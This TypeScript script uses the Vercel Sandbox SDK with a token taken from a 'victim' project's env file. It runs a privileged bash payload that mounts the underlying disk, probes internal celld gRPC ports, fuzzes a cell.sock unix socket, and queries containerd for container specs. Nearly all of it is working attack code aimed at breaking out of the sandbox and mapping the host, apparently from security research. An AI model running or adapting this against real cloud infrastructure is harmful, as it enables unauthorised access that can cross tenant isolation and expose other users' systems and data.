import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
echo "===== full 23456 response ====="
timeout 6 curl -sv --http2-prior-knowledge -X POST "http://127.0.0.1:23456/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg 2>&1 | tail -25
echo "===== full 30001 response ====="
timeout 6 curl -sv --http2-prior-knowledge -X POST "http://127.0.0.1:30001/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg 2>&1 | tail -25
echo "===== cell.sock HTTP path fuzz ====="
for p in / /health /healthz /ping /version /status /v1 /api /metrics /debug/pprof/ /v1/containers /containers /sandboxes /sandbox /cell /info /heartbeat /v2 /v1/snapshots /api/v1/health /ready /readyz /livez; do
  r=$(printf "GET $p HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n" | timeout 2 nc -U $R/run/cell/cell.sock 2>&1 | head -1)
  case "$r" in HTTP/1.*2*) echo "  $p -> $r";; esac
done
echo "===== cell.sock POST probe paths ====="
for p in /v1/sandboxes /v1/containers /containers /api/v1/start /v1/start /create /start; do
  r=$(printf "POST $p HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: 0\\r\\n\\r\\n" | timeout 2 nc -U $R/run/cell/cell.sock 2>&1 | head -1)
  case "$r" in HTTP/1.*2*) echo "  POST $p -> $r";; esac
done
echo "===== containerd container spec decode ====="
timeout 8 curl -s --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock \
  -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \
  -H 'containerd-namespace: default' --data-binary @/tmp/empty.msg \
  -o /tmp/ctr.body "http://unix/containerd.services.containers.v1.Containers/List" 2>&1
strings -a -n 3 /tmp/ctr.body 2>/dev/null | head -80
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore14.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore14.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });